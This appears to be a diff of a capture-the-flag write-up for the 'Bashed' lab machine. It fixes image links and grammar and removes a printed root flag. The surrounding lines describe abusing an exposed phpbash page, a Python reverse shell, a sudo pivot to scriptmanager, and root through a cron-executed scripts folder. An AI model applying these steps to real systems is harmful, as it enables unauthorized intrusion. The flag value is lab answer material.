@@ -36,11 +36,11 @@ Operating System : Linux
  - version : Apache httpd 2.4.18 ((Ubuntu))
 
 Site : 
-![Site Image](/Bashed/Pasted image 20230822151105.png)
+![Site Image](Pasted%20image%2020230822151105.png)
 General information about php bash on site .
 
 after some enumeration we find out that php bash is implemented on this system as well .
-![[Pasted image 20230822153753.png]]
+![](Pasted%20image%2020230822153753.png)
 
 so I run gobuster to find the directory :
 ```
@@ -63,8 +63,8 @@ gobuster dir -u http://10.10.10.68 -w /usr/share/wordlists/dirbuster/directory-l
 /fonts                (Status: 301) [Size: 310] [--> http://10.10.10.68/fonts/]
 ```
 
-I found lot's of directory and started looking for phpbash.php and found it in /dev :
-![[Pasted image 20230822154010.png]]
+I found lots of directory and started looking for phpbash.php and found it in /dev :
+![](Pasted%20image%2020230822154010.png)
 
 I click on it and it allowed me to run cmd on target machine so i use python reverse shell to connect to my attacker machine nc listener :
 ```
@@ -110,7 +110,7 @@ User www-data may run the following commands on bashed:
 
 and find out i can run any thing as user scriptmanager .
 
-so i run this cmd to get scriptmanager's shell :
+so i run this command to get scriptmanager's shell :
 ```
 sudo -u scriptmanager bash -i
 ```
@@ -123,8 +123,8 @@ scriptmanager
 scriptmanager@bashed:/home$
 ```
 
-I moved to "/" directory and found a /script directory with scriptmanager as owner usually all directory in "/" are owned by root :
-![[Pasted image 20230822163842.png]]
+I moved to the "/" directory and found a /script directory with scriptmanager as owner usually all directory in "/" are owned by root :
+![](Pasted%20image%2020230822163842.png)
 
 checking /scripts:
 ```
@@ -157,7 +157,7 @@ f.close
 if we look closely test.py is writing to test.txt but test.txt is owned by root and only he can write , that means test.py is executing with root permission in fact all python files in "/scripts" are executing as root permission because of cronjob mentioned in about section .
 
 so i stored a reverse shell code in rev.py and transfer it using python http server and wget on target machine :
-![[Pasted image 20230822164503.png]]
+![](Pasted%20image%2020230822164503.png)
 
 I started a nc listener and wait for some time for script to run and i got a reverse shell .
 ```
@@ -169,7 +169,7 @@ whoami
 root
 ```
 
-I spawn a tty shell using python one liner :
+I spawned a tty shell using python one liner :
 ```
 python -c 'import pty;pty.spawn("/bin/bash")'
 ```
@@ -187,9 +187,6 @@ drwxr-xr-x  2 root root 4096 Jun  2  2022 .nano
 -rw-r--r--  1 root root  148 Aug 17  2015 .profile
 -r--------  1 root root   33 Aug 22 04:00 root.txt
 -rw-r--r--  1 root root   66 Dec  4  2017 .selected_editor
-root@bashed:~# cat root.txt 
-cat root.txt 
-7d0e756e0b28cee1b2a7de2cb4b28053
 root@bashed:~# 
 ```
 
